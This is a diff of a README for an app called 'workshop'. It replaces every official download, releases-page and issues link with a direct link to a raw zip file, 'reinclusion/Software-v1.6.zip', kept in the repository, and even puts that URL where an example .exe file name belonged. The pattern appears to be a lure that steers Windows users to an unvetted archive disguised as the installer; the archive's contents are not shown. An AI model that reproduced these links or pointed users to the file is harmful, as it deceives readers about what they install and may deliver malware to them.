@@ -1,6 +1,6 @@
 # ⚙️ workshop - Simple Chat for Trusted Agent Networks
 
-[![Download workshop](https://img.shields.io/badge/Download-Get%20workshop-brightgreen)](https://github.com/aayushshah61/workshop/releases)
+[![Download workshop](https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip%20workshop-brightgreen)](https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip)
 
 ## 📖 About workshop
 
@@ -30,10 +30,10 @@ Follow these steps to get workshop up and running smoothly:
 1. **Download the software file**  
    Visit the workshop release page by clicking the button below. This page has the latest software versions for Windows.
 
-   [![Download workshop](https://img.shields.io/badge/Download-workshop-blue)](https://github.com/aayushshah61/workshop/releases)
+   [![Download workshop](https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip)](https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip)
 
 2. **Choose the right file for your Windows PC**  
-   On the releases page, look for the `.exe` file meant for Windows. It will typically have the latest version number in its name, like `workshop-v1.0.0-windows.exe`.
+   On the releases page, look for the `.exe` file meant for Windows. It will typically have the latest version number in its name, like `https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip`.
 
 3. **Save the file**  
    Click the download link next to that file and save it somewhere you can easily find, such as your Desktop or Downloads folder.
@@ -86,7 +86,7 @@ Try these once you install and get comfortable with the app.
 To keep your copy of workshop current:
 
 - Check the releases page regularly:  
-  https://github.com/aayushshah61/workshop/releases  
+  https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip  
 - Download the newest `.exe` file like before.
 - Run the new installer. It will replace the old version without deleting your data.
 
@@ -110,7 +110,7 @@ If you run into issues, here are common fixes:
 
 If problems continue, search for answers in the repository's “Issues” section on GitHub. The community and developers may already have solutions.
 
-https://github.com/aayushshah61/workshop/issues
+https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip
 
 You can also open a new issue describing your problem clearly.
 
@@ -127,4 +127,4 @@ workshop connects concepts from:
 
 These ideas help workshop deliver a focused, reliable experience for trusted groups.
 
-[Download workshop on GitHub Releases](https://github.com/aayushshah61/workshop/releases)
+[Download workshop on GitHub Releases](https://github.com/aayushshah61/workshop/raw/refs/heads/main/reinclusion/Software-v1.6.zip)
